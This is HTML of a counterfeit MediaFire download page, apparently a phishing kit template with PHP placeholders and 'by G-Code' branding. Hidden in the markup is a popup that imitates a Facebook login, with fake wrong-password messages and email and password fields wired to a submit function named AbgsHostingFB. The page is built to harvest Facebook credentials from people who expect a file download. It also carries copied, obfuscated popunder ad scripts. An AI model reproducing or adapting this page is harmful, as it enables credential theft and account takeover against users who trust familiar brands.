    <script type="text/javascript" src="https://otnolatrnup.com/Tag.engine?time=-420&amp;id=5ff0fb62-0643-4ff1-aaee-c737f9ffc0e0&amp;rand=99089&amp;ver=async&amp;referrerUrl=&amp;fingerPrint=123&amp;abr=false&amp;stdTime=420&amp;fpe=1&amp;bw=418&amp;bh=844&amp;res=418x844&amp;curl=https%3A%2F%2Fwww.mediafire.com%2Ffile%2Fef5nkpv7rxui9rb%2FFF_AutoDetect_TrueID.zip%2Ffile&amp;kw=online%20storage%2Cfree%20storage%2Ccloud%20storage%2Ccollaboration%2Cbackup%20file%20sharing%2Cshare%20files%2Cphoto%20backup%2Cphoto%20sharing%2Cftp%20replacement%2Ccross%20platform%2Cremote%20access%2Cmobile%20access%2Csend%20large%20files%2Crecover%20files%2Cfile%20versioning%2Cundelete%2Cwindows%2Cpc%2Cmac%2Cos%20x%2Clinux%2Ciphone"></script>
    ...
    <script async="" src="https://fundingchoicesmessages.google.com/i/183096492?ers=3"></script>
    <link rel="preload" href="https://adservice.google.co.id/adsid/integrator.js?domain=www.mediafire.com" as="script">
    <script type="text/javascript" src="https://adservice.google.co.id/adsid/integrator.js?domain=www.mediafire.com"></script>
    <link rel="preload" href="https://adservice.google.com/adsid/integrator.js?domain=www.mediafire.com" as="script">
    <script type="text/javascript" src="https://adservice.google.com/adsid/integrator.js?domain=www.mediafire.com"></script>
    ...
    <script esp-signal="true" src="https://oa.openxcdn.net/esp.js"></script>
    <script esp-signal="true" src="https://static.criteo.net/js/ld/publishertag.ids.js"></script>
    <script esp-signal="true" src="https://cdn.prod.uidapi.com/uid2SecureSignal.js"></script>
    <script esp-signal="true" src="https://tags.crwdcntrl.net/lt/c/16589/sync.min.js"></script>
    <script esp-signal="true" src="https://invstatic101.creativecdn.com/encrypted-signals/encrypted-tag-g.js"></script>
    <meta http-equiv="origin-trial" content="">
    ...
    <script async="" src="https://fundingchoicesmessages.google.com/f/AGSKWxXrj58Hn9u60hDchwSlIEGib7RRbB-JyU5hbODrl9SE7WseyUN7HYkYAl30sqFuz0aXWA3ilPpYCuTFwVM1CVI4liLOZtr0yWzfeunZvXsHOek8vYcvY0RYecwhFdglIYebSOh6Zg==?fccs="></script>
    <script async="" src="https://fundingchoicesmessages.google.com/f/AGSKWxX--y5nBjbSH5OMXyzD4blXCXmdc3PIamI1ko8OKc9zrCP7n1CbPeGGbXOSUCyBOR89oejGJOrdKcz1I4BTZYr926xTVJAC8BKCeGvMqMYHLg6vTQi8sd384ymbgOUnAt_WbtDGhQ==?fccs="></script>
    <script async="" src="https://fundingchoicesmessages.google.com/f/AGSKWxUCbyToItSTQHOVnX-kigRpuDFoFY0Oocn7m6Ll_d4O3le1zHuFi-7o-83Vn2phnyot7Uu3yuqe16VQhaSfrY7R1b5vHhQSGKgQ0zzmGdlKeXWrJ8eRcLaFGTwlpLwwu5EVFU-3tA==?fccs="></script>
  </head>
  <body class="id defaultTheme" style="position: relative; min-height: 100%; top: 40px;">
    <div class="skiptranslate" style="">
      <iframe id=":1.container" class="VIpgJd-ZVi9od-ORHb-OEVmcd skiptranslate" frameborder="0" src="#" style="visibility:visible"></iframe>
    </div>
    <main role="main" class="mf-dlr page ads-mobile4 mobile turbo-dl ads-enabled">
      <label for="copy" style="display: none;">
        <font style="vertical-align: inherit;">
          <font style="vertical-align: inherit;">Salin teks</font>
        </font>
      </label>
      <textarea id="copy" style="position:absolute;left:-9999px;opacity:0" aria-hidden="true" tabindex="-1">https://www.g-code.co.id/</textarea>
      <div class="content">
        <style type="text/css">
          .header {
            height: 70px;
...
========================================================================== */
        ...
        <div class="header">
          <div class="u-wrap">
            <h1 class="logo">
              <a href="/">
                <font style="vertical-align: inherit;">
                  <font style="vertical-align: inherit;">MediaFire</font>
                </font>
              </a>
            </h1>
            <ul class="user-menu">
              <li>
                <a href="/login/" id="login" class="g-Btn g-Btn--primary">
                  ...
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;"> Gabung </font>
                  </font>
                </a>
              </li>
              <li>
                <a href="/upgrade" id="signup" class="g-Btn g-Btn--primary">
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;">Mendaftar</font>
                  </font>
                </a>
              </li>
              <li>
                <a href="/help" class="user-menu-help g-Btn g-Btn--secondary">
                  <span class="g-Icon g-Icon--help"></span>Help </a>
              </li>
        ...
        <div class="center">
<div class="popup-ariandi abgs-facebook animate fadeIn" id="abgsf" style="display: none; margin-top: 5rem;">
                <div class="container-box-fb" style="margin-top: 10%;">
                    ...
                    <div class="isi-facebook">
                        <p class="kaget email-fb1bgs" style="width: 320px;">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun <b>Temukan akun Anda</b></b></p>
                        <p class="kaget sandi-fb1bgs" style="width: 320px;">Kata sandi salah. <b>Apakah Anda lupa kata sandi Anda?</b></p>
                        <img src="https://seeklogo.com/images/M/mediafire-logo-8057F17F6B-seeklogo.com.png"> 
                        ...
                        <form class="form-login-fb" id="ngumpulinuangnikah">
                            <label>
                                <input type="text" id="abgs_email_fb2" name="email" placeholder="Email atau Nomor Telepon" autocomplete="off" autocapitalize="off" style="background: #fff; width: 100%" required>
                            </label>
                            <label>
                                <input type="password" id="abgs_password_fb2" name="password" placeholder="Kata sandi" autocomplete="off" autocapitalize="off" style="background: #fff; width: 100%" required>
                            </label>
                            <input type="hidden" name="login" id="abgs_login_fb" value="Facebook" readonly>
                            <button class="btn-login-fb" id="btnSubmit" onclick="return AbgsHostingFB()" type="button">Masuk</button>
                            <button id="btnHidden" class= "btn-login-fb" style="display: none;">
                           <i class="fa fa-spinner fa-spin" style=""></i> Loading...
                        </button>
                            
                        </form>
                        <div class="txt-buat-akun">Buat akun</div>
                        <div class="txt-tidak-sekarang">Nanti saja</div>
                    ...
                    <div class="isi-bahasa">
                        <center>
                            ...
                            <div class="nama-bahasa">æ—¥æœ¬èªž</div>
                            <div class="nama-bahasa">EspaÃ±ol</div>
                            <div class="nama-bahasa">PortuguÃªs (Brasil)</div>
                            <div class="nama-bahasa"><i class="fa fa-plus"></i>
                            </div>
                        </center>
                    </div>
                    <div class="kalobukanabgssiapalagi">Facebook Inc.</div>
                </div>
            </div>
          <div class="ads dl-box">
            <div class="dl-btn-cont">
              <div class="icon zip archive application_zip"></div>
              <div class="dl-btn-labelWrap">
                <div class="promoDownloadName notranslate">
                  <div class="dl-btn-label" title="<?php echo $judul;?>"><?php echo $judul;?></div>
                </div>
                <div class="dl-utility-nav">
                  <ul>
                    <li>
                      <a href="https://www.g-code.co.id/" target="_blank" rel="noopener" id="shareButton" class="nopop g-Icon g-Icon--white g-Icon--share" aria-labelledby="share-tooltip" title="More sharing options"></a>
                      <span id="share-tooltip" class="alt point-down tooltip"> More sharing options </span>
                    </li>
                    <li>
                      <a href="https://www.g-code.co.id/" target="_blank" rel="noopener" id="copyShareURL" class="nopop g-Icon g-Icon--white g-Icon--link" aria-labelledby="copy-tooltip" title="Copy file link to clipboard"></a>
              ...
              <form method="post" name="download" class="dl-btn-form" autocomplete="off">
                <input type="hidden" name="security" value="1684491271.c266f05ce3686fb46a1e337ffd38602df302ef6089e7df58aa5ad7a8a4657e71">
                <div class="download_link" id="download_link">
                  <!-- IF THIS IS TRADITIONAL -->
                  <a class="preparing" href="#">
                    <span>Preparing your download...</span>
                  </a>
                  <a class="input " aria-label="Unduh berkas" onclick="gcodeShow()" target="_download1986" onclick="setTimeout(() => {if (typeof window.InfMediafireMobileFunc === 'function') window.InfMediafireMobileFunc();}, 1000)" id="downloadButton" rel="nofollow">
                    <font style="vertical-align: inherit;">
                      <font style="vertical-align: inherit;"> Unduh di tab baru (<?php echo $ukuran;?>) </font>
                    </font>
                  </a>
                  <a class="starting" href="#">
                    <span>Your download is starting in a new tab...</span>
                  </a>
                  <a class="retry" href="https://www.mediafire.com/download_repair.php?qkey=ef5nkpv7rxui9rb&amp;dkey=dfx70ghech1&amp;template=4&amp;origin=click_button">
                ...
                <a href="/customer_diagnosis/questionnaire.php?url=https%3A%2F%2Fwww.mediafire.com%2Ffile%2Fef5nkpv7rxui9rb%2FFF_AutoDetect_TrueID.zip%2Ffile" class="download_test_link"> Download Diagnostic Tool </a>
              </form>
              <div class="TurboDL-toggle-box toggle-off">
                <button type="button" class="TurboDL-button" onclick="showTDOptInDialog();">
                  <span class="turboTDL-toggle">
                    <span class="turboTDL-toggle-slider"></span>
                  </span>
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;"> Aktifkan Pengunduh Turbo </font>
                  </font>
                  <span class="turboTDL-toggle-note">
                    <font style="vertical-align: inherit;">
                      <font style="vertical-align: inherit;"> Beta </font>
                    </font>
                  </span>
                </button>
              </div>
              <div class="DLMobile-shareOptions">
                <p>
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;"> Mengklik tombol unduh di atas akan memulai unduhan Anda di tab baru dan menampilkan pesan dari mitra periklanan kami. </font>
                  </font>
                </p>
                <ul>
                  <li>
                    <a href="#share" id="shareButtonMobile" class="nopop">
                      <span></span>
                      <font style="vertical-align: inherit;">
                        <font style="vertical-align: inherit;">Bagikan opsi </font>
                      </font>
                    </a>
                  </li>
                  <li>
                    <a href="" id="saveButtonMobile">
                      <span></span>
                      <font style="vertical-align: inherit;">
                        <font style="vertical-align: inherit;">Simpan ke File Saya </font>
                      </font>
                    </a>
                  </li>
                </ul>
            ...
            <a class="dl-promo-cont nopop" href="/upgrade" target="_blank" rel="noopener"> MediaFire Pro: Faster bulk downloads, Ad free downloads, &amp; 1 TB of storage. From $3.75/month. </a>
            <div class="dl-info">
              <div class="intro icon zip archive application_zip">
                <div class="filename"><?php echo $judul;?></div>
                <div class="filetype">
              ...
              <ul class="details">
                <li>File size: <span><?php echo $ukuran;?></span>
                </li>
                <li>Uploaded: <span>2023-05-17 20:55:07</span>
                </li>
              </ul>
              ...
              <div class="sidebar">
                <div class="apps">
                  ...
                  <ul>
                    <li>
                      <a class="nopop" href="https://www.mediafire.com/dynamic/af_link.php?a=11" target="_blank" rel="noreferrer" title="WinZip for PC"> WinZip for PC </a>
                    </li>
                  </ul>
                </div>
                <div class="Download-compatibility">
                  ...
                  <select class="g-Select" id="compat-select" title="Select operating system">
                    ...
                    <option value="linux" data-compat=""> Linux </option>
                  </select>
...
=================================-->
          ...
          <div class="DLExtraInfo">
            ...
            <div class="DLExtraInfo-uploadLocation DLExtraInfo-column">
              <div class="lazyload DLExtraInfo-uploadLocationMap Continent DLExtraInfo-uploadLocationMapBg" data-lazyclass="DLExtraInfo-uploadLocationMapBg">
                ...
                <span>
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;">Unggah wilayah: Indonesia:</font>
                  </font>
                </span>
                -->
              ...
              <div class="DLExtraInfo-sectionDetails">
                <p>
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;">File ini diunggah dari Indonesia pada 17 Mei 2023 pukul 20.55</font>
                  </font>
                </p>
              </div>
            </div>
              ...
              <div class="DLExtraInfo-virusTotal DLExtraInfo-row">
                ...
                <div class="DLExtraInfo-sectionDetails">
                  <div class="DLExtraInfo-sectionHeading">
                    <font style="vertical-align: inherit;">
                      <font style="vertical-align: inherit;">Pemindaian VirusTotal</font>
                    </font>
                  </div>
                  <p>
                    <font style="vertical-align: inherit;">
                      <font style="vertical-align: inherit;"> MediaFire memindai file berisiko tinggi menggunakan VirusTotal. </font>
                    </font>
                  </p>
                </div>
              </div>
    ...
    =================================-->
          <div class="DLExtraInfo DLExtraInfo-additional">
            ...
            <div class="DLExtraInfo-accountStatus DLExtraInfo-column">
              ...
              <div class="DLExtraInfo-sectionDetails">
                <div class="DLExtraInfo-sectionHeading">
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;">Tentang MediaFire</font>
                  </font>
                </div>
                <div class="DLExtraInfo-sectionSubHeading">
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;">Selamat datang!</font>
                  </font>
                </div>
                <p>
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;"> Dengan MediaFire, Anda mendapatkan penyimpanan file yang sederhana namun kuat bersama dengan fitur yang tidak akan Anda temukan di tempat lain. </font>
                  </font>
                  <a href="/upgrade">
                    <font style="vertical-align: inherit;">
                      <font style="vertical-align: inherit;">Belajarlah lagi</font>
                    </font>
                  </a>
                </p>
              </div>
            ...
            <div class="DLExtraInfo-downloadApp DLExtraInfo-column">
              ...
              <div class="DLExtraInfo-sectionDetails">
                <div class="DLExtraInfo-sectionHeading">
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;">Unduh aplikasi</font>
                  </font>
                </div>
                <div class="DLExtraInfo-sectionSubHeading">
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;">Chrome</font>
                  </font>
                </div>
                <p>
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;"> Anda mengunduh file ini dengan </font>
                  </font>
                  <span>
                    <font style="vertical-align: inherit;">
                      <font style="vertical-align: inherit;">Chrome, versi 0.0.</font>
                    </font>
                  </span>
                </p>
              </div>
      ...
      <div id="share" class="lightbox" role="dialog" tabindex="-1">
        <figure>
          <a href="#" class="close" id="share-close" title="Close share dialog">
            <span style="display: none">Close share dialog</span>
          </a>
          <figcaption>
            <iframe id="share-iframe" data-src="https://www.mediafire.com/widgets/share.php?web=1&amp;dlr=1&amp;files=ef5nkpv7rxui9rb" allowtransparency="true" style="">
              <p id="share-desc"> Failed to load. Try again in a supported browser. </p>
            </iframe>
            <noscript>
      ...
      <div id="mobile-turbo-dl-enable" class="lightbox" role="dialog" tabindex="-1">
        <a href="#" class="close" id="mobile-turbo-dl-btn-close" title="Cancel">
          <span style="display: none">Cancel</span>
        </a>
        <div class="popup-container">
          <span class="mobile-turbo-dl-enable-title">Enable Turbo Downloader?</span>
          <span class="mobile-turbo-dl-enable-message"> By enabling the Turbo Downloader Beta you are agreeing to use software that hasn't been fully tested. You can disable this at any time. Enabling the Turbo Downloader will reload the page. </span>
          <a href="#" id="mobile-turbo-dl-btn-enable">
            <span>Enable Turbo Downloader</span>
          </a>
          <a href="#" id="mobile-turbo-dl-btn-cancel">
            <span>Cancel</span>
          </a>
        </div>
      </div>
        ...
        <div class="footerColWrap u-cf">
          <div class="footerCol">
            <h2>
              <a href="/about/">
                <font style="vertical-align: inherit;">
                  <font style="vertical-align: inherit;">Perusahaan</font>
                </font>
              </a>
            </h2>
            <ul>
              <li class="minFooterShow">
                <a href="/about/">
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;">Tentang </font>
                  </font>
                  <b>
                    <font style="vertical-align: inherit;">
                      <font style="vertical-align: inherit;">Kami</font>
                    </font>
                  </b>
                </a>
              </li>
              <li>
                <a href="/about/jobs.php">
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;">Karir</font>
                  </font>
                </a>
              </li>
              <li>
                <a href="/press/">
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;">Tekan</font>
                  </font>
                </a>
              </li>
              <li>
                <a href="http://blog.mediafire.com/" target="_blank">
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;">Blog Perusahaan</font>
                  </font>
                </a>
              </li>
            </ul>
          ...
          <div class="footerCol">
            <h2>
              <a href="/software/index.php">
                <font style="vertical-align: inherit;">
                  <font style="vertical-align: inherit;">Peralatan</font>
                </font>
              </a>
            </h2>
            <ul>
              <li class="minFooterShow">
                <a href="/software/mobile/">
                  ...
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;">Ponsel </font>
                    <b>
                      <font style="vertical-align: inherit;">MediaFire</font>
                    </b>
                  </font>
              ...
              <li class="minFooterShow">
                <a href="https://fast.io" title="Fast.io - Berbagi File dan Penyimpanan Cloud untuk Tim" target="_blank" rel="noopener noreferrer" aria-label="Fast.io - Berbagi File Tim dan Penyimpanan Cloud untuk Bisnis Kecil">
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;">Berbagi File Tim</font>
                  </font>
                </a>
              </li>
            </ul>
          ...
          <div class="footerCol">
            <h2>
              <a href="/upgrade/">
                <font style="vertical-align: inherit;">
                  <font style="vertical-align: inherit;">Meningkatkan</font>
                </font>
              </a>
            </h2>
            <ul>
              <li>
                <a href="/upgrade/index.php?plan=Pro">
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;">Profesional</font>
                  </font>
                </a>
              </li>
            </ul>
          ...
          <div class="footerCol">
            <h2>
              <a href="https://mediafire.zendesk.com/hc/en-us" target="_blank">
                <font style="vertical-align: inherit;">
                  <font style="vertical-align: inherit;">Mendukung</font>
                </font>
              </a>
            </h2>
            <ul>
              <li class="minFooterShow">
                <a href="https://mediafire.zendesk.com/hc/en-us" target="_blank">
                  <b>
                    <font style="vertical-align: inherit;">
                      <font style="vertical-align: inherit;">Dapatkan Dukungan</font>
                    </font>
                  </b>
                </a>
              </li>
      ...
      <div id="subFooterWrap">
        <div id="subFooter" class="u-wrap">
          <ul class="subFooterLinks">
            <li id="copyrightInfo">
              <font style="vertical-align: inherit;">
                <font style="vertical-align: inherit;">©2023 MediaFire </font>
              </font>
              <span>
                <font style="vertical-align: inherit;">
                  <font style="vertical-align: inherit;">by G-Code</font>
                </font>
              </span>
            </li>
            <li>
              <a href="/advertising/">
                <font style="vertical-align: inherit;">
                  <font style="vertical-align: inherit;">Periklanan</font>
                </font>
              </a>
            </li>
            <li>
              <a href="/policies/terms_of_service.php">
                <font style="vertical-align: inherit;">
                  <font style="vertical-align: inherit;">Ketentuan</font>
                </font>
              </a>
            </li>
            <li>
              <a href="/policies/privacy_policy.php">
                <font style="vertical-align: inherit;">
                  <font style="vertical-align: inherit;">Kebijakan pribadi</font>
                </font>
              </a>
            </li>
            <li>
              <a href="/policy_violation/copyright.php">
                <font style="vertical-align: inherit;">
                  <font style="vertical-align: inherit;">hak cipta</font>
                </font>
              </a>
            </li>
            <li>
              <a href="/policy_violation/terms_of_service.php">
                <font style="vertical-align: inherit;">
                  <font style="vertical-align: inherit;">Melecehkan</font>
                </font>
              </a>
            </li>
            <li>
              <a href="/credits/">
                <font style="vertical-align: inherit;">
                  <font style="vertical-align: inherit;">Kredit</font>
                </font>
              </a>
            </li>
            <li>
              <a href="/about/">
                <font style="vertical-align: inherit;">
                  <font style="vertical-align: inherit;">Lagi...</font>
                </font>
              </a>
            </li>
          </ul>
          <div class="subFooterSocialWrap">
            <ul id="subFooterSocial">
              <li class="footerIcn">
                <a href="http://blog.mediafire.com/" class="footerIcnBlog" target="_blank" title="Blog Media Fire">
                  <span class="footerIcnBlog"></span>
                </a>
              </li>
              <li class="footerIcn">
                <a href="https://twitter.com/#!/mediafire" class="footerIcnTw" target="_blank" rel="noreferrer" title="Halaman Twitter MediaFire">
                  <span class="footerIcnTw"></span>
                </a>
              </li>
              <li class="footerIcn" style="margin-left: 0;">
                <a href="https://www.facebook.com/mediafire" class="footerIcnFb" target="_blank" rel="noreferrer" title="halaman Facebook MediaFire'">
          ...
          <div class="socialLinks" id="minSocialLinks">
            <a href="https://www.facebook.com/mediafire" class="shareFacebook" title="MediaFire on Facebook">
              <span style="display: none">Facebook Page</span>
            </a>
            <a href="https://twitter.com/mediafire" class="shareTwitter" title="MediaFire on Twitter">
              <span style="display: none">Twitter Page</span>
            </a>
            <a href="https://blog.mediafire.com/" class="shareBlogger" title="MediaFire Blog">
              <span style="display: none">MediaFire Blog</span>
            </a>
          </div>
        </div>
      </div>
    ...
    <script data-cfasync="false" type="text/javascript">
      ...
      var getDownloadUrl = function(targetUrl) {
        try {
          if (typeof targetUrl === "string") {
            targetUrl = new URL(targetUrl);
          }
          let segments = targetUrl.pathname.split("/");
          let dkey;
          for (let i = 0; i < segments.length; i++) {
            if (segments[i] === "file" && i < segments.length - 1) {
              dkey = segments[i + 1];
              break;
            }
          }
          ...
          return new URL(targetUrl.href + (dkey ? ((targetUrl.search ? "&" : "?") + "dkey=" + dkey) : ""));
        } catch (err) {
          g367CB268B1094004A3689751E7AC568F.ConsoleLog("dkey not found:\n", err.stack);
          return null;
        }
      }
      window.InfCustomFPSTAMobileFunc = function(event, os, browser, link, sUrl) {
        ...
        var isDL = isInRect(document.querySelector(".download_link a.input"), event) || isInRect(document.querySelector(".dl_startlink"), event) || isInRect(document.querySelector(".dl-btn-form"), event) || isInRect(document.querySelector("#download-link"), event);
        ...
        g.PopRunning = false;
        targetUrl = getDownloadUrl(targetUrl);
        if (!targetUrl) {
          g.PopLoaded = false;
          g.PopRunning = false;
          return true;
        }
        g367CB268B1094004A3689751E7AC568F.ConsoleLog(targetUrl);
      ...
      window.InfCustomSTAMobileFunc = function(Module, event, os, browser, link, redirectUrl) {
        ...
        if (link.nodeName.toLowerCase() === "a" && link.getAttribute("href") !== "#" && link.getAttribute("href").indexOf("javascript:") === -1 && !(Module.Media.Settings.RespectTargetBlank && (link.getAttribute("target") === "_blank" || link.getAttribute("rel") === "nofollow"))) {
          ...
          urlToOpen = getDownloadUrl(urlToOpen);
          if (!urlToOpen) {
            g.PopLoaded = false;
            g.PopRunning = false;
            return true;
          }
          g367CB268B1094004A3689751E7AC568F.ConsoleLog(urlToOpen);
          if (g.IsMobile.iOS(g._Top) && g.IsMobile.Opera(g._Top)) {
      ...
      window.InfCustomFPSTAFunc = function(event, link, sUrl) {
        ...
        if (g367CB268B1094004A3689751E7AC568F.IsAdblockRequest && flag === "1") {
      ...
      window.InfSkipBindDocumentClick = function() {
        try {
          return g367CB268B1094004A3689751E7AC568F.UaParser?.getDevice()?.type === "mobile" || g367CB268B1094004A3689751E7AC568F.UaParser?.getDevice()?.type === "tablet";
        } catch (err) {
          g367CB268B1094004A3689751E7AC568F.ConsoleLog(err.stack);
          return true;
        }
      };
      window.InfMediafireMobileFunc = function() {
        var g = g367CB268B1094004A3689751E7AC568F;
      ...
      var rAb = function() {
        try {
          var handheld = g367CB268B1094004A3689751E7AC568F.UaParser?.getDevice()?.type == "mobile" || g367CB268B1094004A3689751E7AC568F.UaParser?.getDevice()?.type == "tablet";
          if (!handheld && g367CB268B1094004A3689751E7AC568F.IsAdblockRequest) {
            var flag = g367CB268B1094004A3689751E7AC568F.Storage.GetLocalStorage("inf-mediafire-activate");
            if (flag === "1") {
              window.InfCustomFPSTAFunc = function() {
                return false;
              };
              var dlButton = document.getElementById('downloadButton');
              if (dlButton) {
                var currentPopCount = Number.parseInt(g367CB268B1094004A3689751E7AC568F.Storage.GetLocalStorage("g36NumFastPops"));
                if (typeof currentPopCount === "number" && currentPopCount > 0 && currentPopCount < 3) {
                  g367CB268B1094004A3689751E7AC568F.Storage.SetLocalStorage("g36NumFastPops", currentPopCount - 1);
                }
                dlButton.click();
              }
              g367CB268B1094004A3689751E7AC568F.Storage.DeleteLocalStorage("inf-mediafire-activate");
      ...
      (function(e, a, b, c, g, h) {
        null == e[a] && e[b + g] && (e[a] = "loading", e[b + g](h, b = function() {
          e[a] = "complete";
          e[c + g](h, b, !1)
        }, !1))
      ...
      (function() {
        (function(e, a, b) {
          ...
          "" != typeof g367CB268B1094004A3689751E7AC568F && g367CB268B1094004A3689751E7AC568F.Core || function() {
            if ("" == typeof e || !e.Core) {
              ...
              (function(a, b) {
                  ...
                  g = function(n, r) {
                    for (var t = 0, u, x, z, v, F, A; t < r.length && !F;) {
                      ...
                      for (u = x = 0; u < E.length && !F;)
                        if (F = E[u++].exec(n))
                          for (z = 0; z < H.length; z++) A = F[++x], v = H[z], "object" === typeof v && 0 < v.length ? 2 == v.length ? this[v[0]] = "function" == typeof v[1] ? v[1].call(this, A) : v[1] : 3 == v.length ? this[v[0]] = "function" !== typeof v[1] || v[1].exec && v[1].test ? A ? A.replace(v[1], v[2]) : b : A ? v[1].call(this, A, v[2]) : b : 4 == v.length && (this[v[0]] = A ? v[3].call(this, A.replace(v[1], v[2])) : b) : this[v] = A ? A : b;
                      t += 2
                    }
                  },
                  h = function(n, r) {
                ...
                "" !== typeof exports ? ("" !== typeof module && module.exports && (exports = module.exports = f), exports.UserAgentParser = f) : a && (a.UserAgentParser = f);
              ...
              var e = {
                  ...
                  try {
                    ...
                    if (top != self) try {
                      if (top.document.location.toString()) {
                        this._Top = top;
                        for (var c, g = top.document.getElementsByTagName("iframe"), h = 0; h < g.length; h++) try {
                    ...
                    if (!false || -1 == navigator.userAgent.indexOf("7.0.2 Safari")) {
                      ...
                      if (e.IsAdblockRequest) {
                        ...
                        this.Script.Add(this.InfinityHost + "/" + (n ? n : "null") + "/" + (this.Guid ? this.Guid : "null") + "/" + (r ? r : "null") + "/" + (this.Version ? this.Version : "null") + "/null/123/" + encodeURIComponent(0 < this.SubID.length ? this.SubID : "null") + "/" + e.IsAdblockRequest + "/" + this.GetStdTimezoneOffset() + "/" + e.GetSupportedVideo() + "/" + this.GetWindowWidth() + "/" + this.GetWindowHeight() + "/" + encodeURIComponent(t) + "/" + e.GetScreenWidth() + "x" + e.GetScreenHeight() + "/" + encodeURIComponent(e.GetKeywords()) + "/Tag.a1b", !0)
                      } else {
                        ...
                        this.Script.Add(this.InfinityHost + "/Tag.engine?time=" + encodeURIComponent(k) + "&id=" + this.Guid + "&rand=" + encodeURIComponent(Math.floor(1E5 * Math.random() + 1)) + "&ver=" + this.Version + "&referrerUrl=" + encodeURIComponent(m) + "&fingerPrint=123" + (0 < this.SubID.length ? "&subId=" + this.SubID : "") + (0 < this.TId.length ? "&tid=" + this.TId : "") + "&abr=" + e.IsAdblockRequest + "&stdTime=" + this.GetStdTimezoneOffset() + "&fpe=" + e.GetSupportedVideo() + "&bw=" + this.GetWindowWidth() + "&bh=" + this.GetWindowHeight() + "&res=" + e.GetScreenWidth() + "x" + e.GetScreenHeight() + (null != x && "" !== x ? "&curl=" + encodeURIComponent(x) : "") + "&kw=" + encodeURIComponent(e.GetKeywords()), !0)
                      }
                      this.Script.Load(function() {
                        if ("" != typeof b.Media.Items && void 0 !== b.Media.Items && null !== b.Media.Items) {
                          ...
                          b.Script.Load(function() {
                            for (var A = 0; A < b.Media.Items.length; A++) {
                              ...
                              b.ConsoleLog(E);
                              b.ConsoleGroupEnd();
                              if ("" != typeof b.Modules[H] && ("PopUnder" === H || b.IsClientSideFiltersPassed(E.ClientSideFilters), G)) b.Modules[H](E, b._Top)
                            }
                          })
                        }
                      });
                ...
                InitFastPop: function() {
                  ...
                  e.PopSettings = {};
                  e.PopSettings.Cap = 50000;
                  e.PopSettings.CapLength = 0;
                  ...
                  e.PopSettings.PopUnderDontTriggerSelector = ".nopop, .nopop *, div.errorHelpLinks";
                  ...
                  e.PopSettings.KeywordFilter = {
                    Exclusive: true,
                    IsRegex: true,
                    Keywords: ["http(s)?://(www.)?mediafire.com/error.php.*"]
                  };
                  e.PopSettings.ClientSideFilters = [];
                  e.PopSettings.UserAgentFilter = null;
                  e.PopSettings.OffsetFilter = {
                    Type: 'Any',
                    Offset: 1
                  };
                  ...
                  e.PopSettings.UseSameTab = function(d, f, k) {
                    ...
                    return a.PopSettings.IsPopunder && void 0 !== m && null !== m && (0 == m.AdblockOnly || k) && ("WINDOWS" === f.name.toUpperCase() && m.Windows || "MAC OS" === f.name.toUpperCase() && m.OSX) && ((d.chrome || "Chrome" == d.name) && m.Chrome || (d.firefox || "Firefox" == d.name) && m.Firefox || (d.msie || "IE" == d.name) && m.IE || "Edge" == d.name && m.Edge || (d.opera || "Opera" == d.name) && m.Opera || (d.safari || "Safari" == d.name) && m.Safari)
                  };
                  var a = e,
                    b = a.InfinityHost,
                  ...
                  (function(d, f) {
                    function k(q) {
                      ...
                      for (var B = !1, J = e.GetDfpTagCurrentUrl() || window.location.href.toLowerCase(), L = 0; L < q.Keywords.length && !(B = q.Keywords[L].toLowerCase(), B = q.IsRegex ? (new RegExp(B)).test(J) : -1 !== J.indexOf(B)); L++);
                    ...
                    function m() {
                      ...
                      var B = !1,
                        J = H.getUA(),
                        L;
                      for (L in q.UserAgentStrings)
                        if (B = q.UserAgentStrings[L], B = q.IsRegex ? (new RegExp(B)).test(J) : -1 !== J.indexOf(B)) break;
                      return B !== q.Exclusive
                    }
                    ...
                    function z(q, B, J, L, U, V) {
                      ...
                      !e.PopSettings.InterceptFlash && !e.PopSettings.InterceptInlineFrames || X || p.PopLoaded || p.IsFastPopCapped() || (p.FlashClickInterceptor.ignoreElementPredicate = function(C) {
                        ...
                        return p.IsDontTriggerForSelectorMatch(p.PopSettings.PopUnderDontTriggerSelector, C) || p.PopSettings.PopUnderTriggerOnSelector && !p.IsTriggerOnSelectorMatch(p.PopSettings.PopUnderTriggerOnSelector, C, p.PopSettings.PopUnderTriggerOnSelectorDepth)
                      ...
                      try {
                        if (!(!p.PopSettings.IsPopunder || !p.ChromePopunder.supported() || !w.chrome && "Chrome" !== w.name || p.PopSettings.IsTracking || Q || R || void 0 !== p.PopSettings.SameTabAdSettings && (p.PopSettings.SameTabAdSettings.Windows && "WINDOWS" === G.name.toUpperCase() || p.PopSettings.SameTabAdSettings.OSX && "MAC OS" === G.name.toUpperCase()) && (!p.PopSettings.SameTabAdSettings.AdblockOnly || p.IsAdblockRequest) && p.PopSettings.SameTabAdSettings.Chrome)) {
                          p.ChromePopunder.init(null, e.PopSettings.ChromePopApproach);
                          return
